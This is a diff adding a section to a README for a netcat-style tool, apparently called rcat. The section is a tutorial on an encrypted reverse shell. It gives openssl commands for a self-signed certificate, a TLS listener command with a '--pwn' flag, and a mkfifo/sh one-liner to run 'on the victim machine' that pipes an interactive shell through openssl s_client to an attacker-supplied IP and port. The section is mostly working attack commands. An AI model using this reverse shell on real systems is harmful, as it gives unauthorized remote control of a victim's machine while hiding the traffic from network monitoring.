@@ -45,3 +45,31 @@ Here we do an HTTPS request. We use `-t` to establish a _TLS connection_, and `-
 <img src="images/rcat_tls.svg">
 
   
+## Encrypted Reverse shell
+
+With TLS support, let's see how we can do an __TLS encrypted reverse shell__. Without installing any new tools on the victim.
+
+If possible, you should probaby use a signed certificate (with [let's encrypt](https://certbot.eff.org/instructions) for example), but for now let's use a self-signed certificate.
+
+### Generate Key and Certificate
+
+Let's generate a __self-signed certificate__ with `openssl`.
+
+```bash
+openssl genrsa -out private-key.pem 2048
+openssl req -new -x509 -key private-key.pem -out my.cert -days 365
+```
+
+### Reverse Shell
+
+Armed with this, let's create a _listener_ that supports TLS.
+
+```bash
+rcat -l 9001 -t --cert my.cert --key private-key.pem --pwn
+```
+
+And execute the following command on the victim machine:
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| openssl s_client -connect YOUR_IP:9001 >/tmp/f
+```
